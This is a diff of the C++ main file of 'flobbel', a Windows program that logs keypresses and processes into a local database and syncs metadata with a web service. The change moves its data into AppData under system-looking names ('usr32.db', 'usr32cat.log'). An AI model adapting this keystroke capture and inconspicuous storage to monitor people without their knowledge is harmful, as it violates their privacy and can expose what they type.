@@ -1,7 +1,8 @@
 #include <iostream>
 #include <deque>
 
-#include <winsock2.h>
+#include <shlwapi.h>
+#include <shlobj.h>
 #include "flobcallbackcollection.h"
 #include "FlobbelSafe.h"
 #include "FlobWS.h"
@@ -25,11 +26,12 @@ int main(int argc, char**argv) {
     }
     initialize_flobbel();
     if(!SetConsoleCtrlHandler(control_handler, TRUE)){
-        std::cerr << "ERROR Doing SetConsoleCtrlHandler\n";
+        std::cerr << "ERROR Doing SetConsoleCtrlHandler in main()\n";
     }
     FCS.callbackCollection->run();
     delete FCS.callbackCollection;
     delete FCS.safe;
+    delete FCS.flobWS;
     return 0;
 }
 
@@ -41,7 +43,7 @@ void process(ProcessInfo info){
 void keypress(KeypressInfo info){
     std::wstring d(info.descr,4);
     if(info.updown %2 == 0) {
-        std::wcout << d << L" " << std::hex << info.ch << L"\n";
+        std::wcout << d << L" " << FCS.converter.from_bytes(info.ch) << L"\n";
         keySequence(info.vkcode);
     }
     FCS.safe->save(info, FlobConstants::Keypress);
@@ -95,17 +97,33 @@ void keySequence(DWORD vkCode){
 
 void initialize_flobbel() {
     initMap();
-    FlobWS flobWS;
+    FCS.flobWS = new FlobWS();
     std::set<std::wstring> bl;
+
+    //get uuid
+    wchar_t appdataPath[MAX_PATH] = {0};
+    if(SHGetFolderPathW(0,CSIDL_APPDATA, NULL, 0, appdataPath) != ERROR_SUCCESS){
+        std::cerr << "ERROR retrieving appdata Path\n";
+        exit(1);
+    }
+    FCS.savedirectory = std::wstring(appdataPath);
+    FCS.db_path = FCS.savedirectory + L"/usr32.db";
+
+    PathAppendW(appdataPath, L"usr32cat.log");
+    bool writeHandleToFile = false;
+    if(PathFileExistsW(appdataPath)){
+        std::ifstream in(FCS.converter.to_bytes(appdataPath));
+        in >> FCS.handle;
+        in.close();
+    }else{
+        FCS.handle = "REQUEST";
+        writeHandleToFile = true;
+    }
     try{
-        bl = flobWS.sync_metadata();
-    }catch(SynchroFailed sf){
-        std::cerr << sf.what();
-        FCS.globalHandle = INVALID_CP_HANDLE;
-        wchar_t buffer[1024];
-        GetTempPathW(1024, buffer);
-        FCS.savedirectory = buffer;
-        FCS.db_path = FCS.savedirectory+L"flobsave.db";
+        bl = FCS.flobWS->sync_metadata();
+    }
+    catch(SynchroFailed sf){
+        std::cerr << "ERROR: SYNCHRO FAILED: " << sf.what();
 
         bl.insert(L"svchost.exe");
         bl.insert(L"ctfmon.exe");
@@ -115,6 +133,14 @@ void initialize_flobbel() {
         bl.insert(L"[System Process]");
         bl.insert(L"winlogon.exe");
         bl.insert(L"wininit.exe");
+    }
+    catch(...){
+        std::cerr << "ERROR: Unknown error while syncing\n";
+    }
+    if(writeHandleToFile){
+        std::ofstream out(FCS.converter.to_bytes(appdataPath), std::ios::trunc|std::ios::out);
+        out << FCS.handle;
+        out.close();
     }
 
     FCS.safe = new FlobbelSafe(FCS.savedirectory);
